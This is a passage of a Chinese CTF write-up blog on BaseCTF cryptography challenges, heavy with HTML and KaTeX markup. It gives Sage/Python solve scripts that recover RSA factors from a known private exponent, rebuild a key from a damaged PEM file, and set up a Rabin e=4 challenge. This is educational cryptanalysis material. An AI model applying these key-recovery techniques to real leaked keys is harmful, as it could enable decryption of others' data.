mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">便</span><span class="mord cjk_fallback">想</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">给</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">遍</span><span class="mord cjk_fallback">历</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">范</span><span class="mord cjk_fallback">围</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">个</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">范</span><span class="mord cjk_fallback">围</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">推</span><span class="mord cjk_fallback">测</span><span class="mord cjk_fallback">为</span><span class="mord">2</span><span class="mord">5</span><span class="mord">6</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">解</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">全</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">全</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">排</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span></span></span></span></span></p><blockquote><p>当然也可以直接对e*d-1进行分解然后排列组合，但好像耗时比较长</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br>c = <span class="hljs-number">78919950899709764543039048006935881842075789773495004639436106636461009323420</span><br>e = <span class="hljs-number">65537</span><br>d = <span class="hljs-number">13002488326322253055272696035053386340217207134816593767440035447757509399233</span><br>p_bits=<span class="hljs-number">128</span><br>q_bits=<span class="hljs-number">128</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_phi</span>(<span class="hljs-params">e, d</span>):<br>    k_phi = e*d -<span class="hljs-number">1</span><br>    result = []<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(e,<span class="hljs-number">2</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> k_phi % k == <span class="hljs-number">0</span>:<br>            tmp = k_phi // k<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(tmp).bit_length()==p_bits+q_bits:<br>                result.append(tmp)<br>    <span class="hljs-keyword">return</span> result<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    phi_list = get_phi(e,d)  <span class="hljs-comment">#获得可能的phi_n列表</span><br>    count = <span class="hljs-built_in">len</span>(phi_list)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;一共有<span class="hljs-subst">&#123;count&#125;</span>个可能的phi&#x27;</span>)<br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> phi <span class="hljs-keyword">in</span> phi_list:<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;count&#125;</span> 正在尝试爆破 <span class="hljs-subst">&#123;phi&#125;</span>&#x27;</span>)<br>        factors = factor(phi)  <span class="hljs-comment"># 分解phi_n得到质因子列表</span><br>        result = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> factors:<br>            num, times = <span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]), i[<span class="hljs-number">1</span>]<br>            result += [num] * times<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(factors)&gt;<span class="hljs-number">1</span>:<br>            s = <span class="hljs-built_in">set</span>()<br>            <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(result) + <span class="hljs-number">1</span>):<br>                combination = <span class="hljs-built_in">list</span>(itertools.combinations(result, r))<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> combination:<br>                    s.add(i)<br>            ans=[]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>                tmp=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>                    tmp=tmp*j<br>                ans.append(tmp)<br>            <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> ans:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(num+<span class="hljs-number">1</span>).bit_length()==p_bits <span class="hljs-keyword">and</span> is_prime(num+<span class="hljs-number">1</span>):<br>                    p = num+<span class="hljs-number">1</span><br>                    q = phi // num + <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">if</span> is_prime(q):<br>                        n = p * q<br>                        flag=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n)))<br>                        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;BaseCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>                            <span class="hljs-built_in">print</span>(flag)<br>                            <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><span class="hljs-comment">#b&#x27;BaseCTF&#123;3e226a94-babb27696416&#125;&#x27;</span><br><br></code></pre></td></tr></table></figure><h2 id="week4"><a class="markdownIt-Anchor" href="#week4"></a> week4</h2><h3 id="哎呀数据丢失了"><a class="markdownIt-Anchor" href="#哎呀数据丢失了"></a> 哎呀数据丢失了</h3><p>具体分析我就不说了，最简单的证书分析，base64解码后前三个数据分别就是n,e,d。</p><p>贴一篇文章：<a href="https://tover.xyz/p/pem-by-hand/">https://tover.xyz/p/pem-by-hand/</a></p><p>说几句证书相关的关键点，一般来说手撕确实的证书分析就是把数据base64解密一下再转十六进制分析。</p><p>接下来就是找02开头的数据，然后看02后面的数据是不是跟着长度（一般根据n的bits来判断）</p><p>如果不对，那就从新开始，删去第一个字符在进行base64解密，依次反复知道正确。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br><br>n=<span class="hljs-number">0x00bd278484122aef9a69ec647290219ded06edd2b7611721b326850b2f5060daeed7694356667c479ca9ccb6969f4fbe6dc7fa6759aca21d8a96a881a8e4a0217732757e649d503191511fa96da42ed1da2fa3bc8c9c65fbd9c0dd6f430359ac45e455d32c5b0ea29d21e647ff80e50abcbb80f76adb67007a04e85dbaeb4c8f1d</span><br>e=<span class="hljs-number">0x010001</span><br>d=<span class="hljs-number">0x2265e355593071ae3501062b4746b5bf7af918cebc5b46879bc3aa0b0aa4f26b68c4fdb7e29f4b2e943a6421f40abe689c6b4f0c21b6c184886d5056f46ca26908540ec07b82ad47e667971a01fac6162e93a7fc61aed5660f826aeba34d78accd18fc59e7921701f10ff51d52883706b864287cfdb34e309c93829d29d867c9</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    c=f.read()<br>    m=bytes_to_long(c)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(m,d,n)))<br><br><span class="hljs-string">&quot;&quot;&quot;30 </span><br><span class="hljs-string">82 025c </span><br><span class="hljs-string">0201 00 </span><br><span class="hljs-string">02 81 81 00bd278484122aef9a69ec647290219ded06edd2b7611721b326850b2f5060daeed7694356667c479ca9ccb6969f4fbe6dc7fa6759aca21d8a96a881a8e4a0217732757e649d503191511fa96da42ed1da2fa3bc8c9c65fbd9c0dd6f430359ac45e455d32c5b0ea29d21e647ff80e50abcbb80f76adb67007a04e85dbaeb4c8f1d</span><br><span class="hljs-string">02 03 010001</span><br><span class="hljs-string">02 81 80 2265e355593071ae3501062b4746b5bf7af918cebc5b46879bc3aa0b0aa4f26b68c4fdb7e29f4b2e943a6421f40abe689c6b4f0c21b6c184886d5056f46ca26908540ec07b82ad47e667971a01fac6162e93a7fc61aed5660f826aeba34d78accd18fc59e7921701f10ff51d52883706b864287cfdb34e309c93829d29d867c9</span><br><span class="hljs-string">02 41 00c6e091a25cd8e75937af8370674f71ff000ce87a49a8374e654fe3b1877c63813c895c3cb83da4c3bc457aeedef78574bba69b1ac3a21d3fcd0b3a1ffa05aa93</span><br><span class="hljs-string">02 41 00f37c0714f1d2e836e73a806ddb3509245539ceb363623d3e4f7887456580519cb513f6564508c8d5ea6b9ccb0b67b58168243bb96d61e8db6377413bbb95fd8f</span><br><span class="hljs-string"></span><br><span class="hljs-string">02404e066d1cb630a3136db57e6beb1c5</span><br><span class="hljs-string">02d2b67e50d953859fa77e50fffe697f6b20d7e16a1fbe6b36dd7bfaaab6ceecf7d2ce200984f889ad11d30fa6cf13aa7e1</span><br><span class="hljs-string">024100a3c4583f0e27fd68703e3903aadd11390ed9c2dd858b1e063b0da66e56c6e81daeedae52783c60590143404291793febba5</span><br><span class="hljs-string">0249ba3a6a72868ce5d61ffd9f2a1</span><br><span class="hljs-string">0240369cfe9a217</span><br><span class="hljs-string">02c39b0d07fdf8a4d82fe362177dd92fc82</span><br><span class="hljs-string">02d699914b9a634016f6e30e270bde8c2d0068743a77d2fa8831cba75536e0f2f1578ddd4e4b5e7685&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="rabin"><a class="markdownIt-Anchor" href="#rabin"></a> rabin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br>flag=<span class="hljs-string">b&quot;BaseCTF&#123;&#125;&quot;</span><br>m = bytes_to_long(flag)<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-keyword">assert</span> p%<span class="hljs-number">4</span>==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> q%<span class="hljs-number">4</span>==<span class="hljs-number">3</span><br>n = p*q<br>e = <span class="hljs-number">4</span><br><br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p=&quot;</span>,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q=&quot;</span>,q)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n=&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e=&quot;</span>,e)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p= 8531212975719216550108614256955774722172741885676113601617182716356239301381951899737237219659253655889636684200345109462928796329670321336864298557778843</span><br><span class="hljs-string">q= 7443256287912111739335729314443559886458007838130371799255078565502662459436043455787869631999073617967343884377537828940738213460508765519478956421282871</span><br><span class="hljs-string">n= 63500004625039456439237191267891267558404574431112995926594213383621331385226487443753506088788203040258384788149958095020759745138424276657604371402824844725005596890673468964961037168078105356669148960568974603581485045691990626520286184874115519591663033533771400334558853058140717812903874350138362098253</span><br><span class="hljs-string">c= 51452608438757130697131508192775727191605112918772187364577097224326062184288501602000700342623122861398852536963355962672293705131887315354242193416090384360837672258861475017098419459125395949090523474744886423754439919504732741712693909507972791203801494594878447921609420574365853676576693694677914169353</span><br><span class="hljs-string">e= 4</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>高次rabin攻击</p><blockquote><p>详见：<a href="https://www.nssctf.cn/note/set/7">文章列表 | NSSCTF</a></p></blockquote><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mn>4</mn></msup><mo>≡</mo><msup><mi>x</mi><mn>2</mn></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mspace linebreak="newline"></mspace><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mn>4</mn></msup><mo>≡</mo><msup><mi>x</mi><mn>2</mn></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mspace width="1em"/><mtext>说明</mtext><mi>c</mi><mtext>是模</mtext><mi>p</mi><mtext>下的二次剩余</mtext><mspace linebreak="newline"></mspace><mtext>可得这条结论</mtext><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><mn>2</mn></mfrac></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace><mtext>（详细证明看上面</mtext><mi>N</mi><mi>S</mi><mi>S</mi><mi>C</mi><mi>T</mi><mi>F</mi><mtext>中</mtext><mi>x</mi><mi>e</mi><mi>n</mi><mi>n</mi><mi>y</mi><mtext>师傅的文章）</mtext><mspace linebreak="newline"></mspace><msup><mi>x</mi><mn>2</mn></msup><mo>≡</mo><mi>c</mi><mo>≡</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><mn>2</mn></mfrac></msup><mo>∗</mo><mi>c</mi><mo>≡</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace><mtext>由条件</mtext><mi>p</mi><mo>≡</mo><mn>3</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mn>4</mn><mtext>，可知</mtext><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></msup><mtext>可以进行开方</mtext><mspace linebreak="newline"></mspace><mtext>得：</mtext><msub><mi>x</mi><mn>1</mn></msub><mo>≡</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mtext>和</mtext><msub><mi>x</mi><mn>2</mn></msub><mo>≡</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><msup><mi>c</mi><mfrac><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace><mtext>同理得：</mtext><msub><mi>x</mi><mn>3</mn></msub><mo>≡</mo><msup><mi>c</mi><mfrac><mrow><mi>q</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mtext>和</mtext><msub><mi>x</mi><mn>4</mn></msub><mo>≡</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><msup><mi>c</mi><mfrac><mrow><mi>q</mi><mo>+</mo><mn>1</mn></mrow><mn>4</mn></mfrac></msup><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace linebreak="newline"></mspace><mtext>之后对</mtext><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>4</mn></msub><mtext>都再进行一次</mtext><mi>r</mi><mi>a</mi><mi>b</mi><mi>i</mi><mi>n</mi><mtext>就可以得到</mtext><mn>16</mn><mtext>个</mtext><msub><mi>m</mi><mi>i</mi></msub><mspace linebreak="newline"></mspace><mtext>进行筛选可得最终</mtext><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi></mrow><annotation encoding="application/x-tex">c\equiv m^4\equiv x^2\mod n\\c\equiv m^4\equiv x^2\mod p\quad说明c是模p下的二次剩余\\可得这条结论c^{\frac{p-1}{2}}\equiv 1\mod p\\（详细证明看上面NSSCTF中xenny师傅的文章）\\x^2\equiv c\equiv c^{\frac{p-1}{2}}*c\equiv c^{\frac{p+1}{2}}\mod p\\由条件p\equiv3\mod4，可知c^{\frac{p+1}{2}}可以进行开方\\得：x_1\equiv c^{\frac{p+1}{4}}\mod p和x_2\equiv(p-c^{\frac{p+1}{4}})\mod p\\同理得：x_3\equiv c^{\frac{q+1}{4}}\mod q和x_4\equiv(q-c^{\frac{q+1}{4}})\mod q\\之后对x_1,x_2,x_3,x_4都再进行一次rabin就可以得到16个m_i\\进行筛选可得最终flag</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:1em;"></span><span class="mord cjk_fallback">说</span><span class="mord cjk_fallback">明</span><span class="mord mathnormal">c</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">剩</span><span class="mord cjk_fallback">余</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0588899999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">论</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" 